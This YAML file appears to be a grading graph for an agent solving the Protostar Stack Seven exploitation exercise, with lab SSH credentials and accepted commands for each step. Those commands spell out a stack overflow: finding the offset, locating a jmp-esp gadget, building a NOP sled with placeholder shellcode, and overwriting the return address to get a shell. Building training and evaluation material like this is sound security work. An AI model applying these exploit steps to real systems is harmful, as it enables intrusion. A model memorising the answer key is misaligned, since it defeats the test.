version: '0.5'
graph:
  type: reference
challenge:
  id: protostar_stack7
  name: Protostar Stack Seven
  description: Bypass the broader return-address restriction by returning to a suitable instruction sequence in .text and pivoting into shellcode.
attacker_context:
  user: user
  access:
    method: ssh
    credentials:
      username: user
      password: user
  target:
    host: <target-hostname-or-ip>
    port: 22
goal:
  node: node4
irrelevant_commands:
- pwd
- id
- whoami
- clear
- history
- uname
- hostname
- man
- strings
- checksec
- file
- ls
- ls -la
- env
- printenv
nodes:
- id: start
  type: sentinel
  label: Start
- id: node0
  type: state
  label: Saved EIP offset identified
- id: node1
  type: state
  label: Suitable return-into-.text gadget identified
- id: node2
  type: state
  label: Shellcode payload prepared
- id: node3
  type: state
  label: Return target adjusted to jump into shellcode
- id: node4
  type: state
  label: Interactive shell obtained
edges:
- id: edge0
  from: start
  to: node0
  action: find_saved_eip_offset
  accepted_commands:
  - gdb -q /opt/protostar/bin/stack7
  - python -c 'print "A"*80' | /opt/protostar/bin/stack7
  transition_match:
    exit_code: 0
    stdout_regex: .*
    stderr_regex: .*
- id: edge1
  from: node0
  to: node1
  action: find_text_gadget_such_as_jmp_esp
  accepted_commands:
  - objdump -d /opt/protostar/bin/stack7 | egrep "jmp.*%esp|call.*%esp"
  - msfelfscan -j esp /opt/protostar/bin/stack7
  transition_match:
    exit_code: 0
    stdout_regex: .*(jmp|call).*esp.*
    stderr_regex: .*
- id: edge2
  from: node1
  to: node2
  action: prepare_nopsled_and_shellcode
  accepted_commands:
  - python -c 'print "\x90"*32 + "<shellcode>" + "A"*(80-32-len("<shellcode>"))' > /tmp/stack7.in
  transition_match:
    exit_code: 0
    stdout_regex: ^$
    stderr_regex: ^$
- id: edge3
  from: node2
  to: node3
  action: append_text_gadget_address
  accepted_commands:
  - python -c 'import struct; body="\x90"*32 + "<shellcode>" + "A"*(80-32-len("<shellcode>")); print body + struct.pack("<I", 0x08048544)' > /tmp/stack7.in
  transition_match:
    exit_code: 0
    stdout_regex: ^$
    stderr_regex: ^$
- id: edge4
  from: node3
  to: node4
  action: trigger_return_to_text_and_shellcode
  accepted_commands:
  - /opt/protostar/bin/stack7 < /tmp/stack7.in
  transition_match:
    exit_code: 0
    stdout_regex: .*(sh-|[$#]).*
    stderr_regex: .*
